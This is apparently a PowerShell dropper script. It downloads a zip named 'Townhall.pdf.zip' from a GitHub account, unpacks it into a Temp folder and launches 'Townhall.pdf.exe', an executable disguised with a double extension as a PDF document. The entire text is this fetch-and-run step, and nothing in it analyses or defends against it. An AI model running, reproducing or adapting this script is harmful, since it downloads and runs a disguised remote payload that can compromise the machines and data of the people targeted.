mkdir $env:Temp\Townhall
cd $env:Temp\Townhall
Invoke-WebRequest -OutFile $env:Temp\townhall.pdf.zip "https://github.com/e0X1337/e0X1337/raw/refs/heads/main/Townhall.pdf.zip"
$file1 = "$env:Temp\Townhall.pdf.zip"
Expand-Archive -Path $file1 -DestinationPath . -Force
Start-Process .\Townhall.pdf.exe